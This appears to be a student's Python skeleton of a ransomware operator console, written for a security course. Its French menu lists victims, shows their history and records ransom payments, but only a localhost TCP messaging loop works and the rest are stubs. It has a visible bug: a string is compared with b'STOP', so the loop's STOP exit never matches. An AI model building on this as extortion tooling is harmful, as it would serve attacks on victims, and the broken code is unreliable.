# --------------------------------------------

# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : main

# --------------------------------------------
import socket
def main():
    """ Console de contrôle """
    # Key server start
    print('CONSOLE DE CONTRÔLE'
          '\n==================='
          '\n1) Liste des victimes du ransomware'
          '\n2) Historique des états d''une victime'
          '\n3) Renseigner le paiement de rançon d''une victime'
          '\n4) Quitter')
    choix = input('Votre choix : ')
    while choix != '4':
        if choix == '1':
            listing()
        elif choix == '2':
            print(history())
        elif choix == '3':
            print(fill_payload())
        elif choix == '4':
            print(quit())
            break
        choix = input('Votre choix : ')


def listing():
    """ Send msg to TCP server which will interpret IT and give a feed-back"""
    msg = input(b'Client : Entrez un message ou STOP pour arreter : ')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("localhost", 8380))
    while msg != b"STOP":
        s.send(bytes(msg, 'utf-8'))
        data = s.recv(2048)
        print('Réception de données de la part du serveur : ' + str(data))
        msg = input("Réponse ou STOP pour sortir : ")
    s.close()



def history():
    return 'Todo history'


def fill_payload():
    return 'Todo payload'


def quit():
    return 'Bonne journée'


if __name__ == '__main__':
    main()
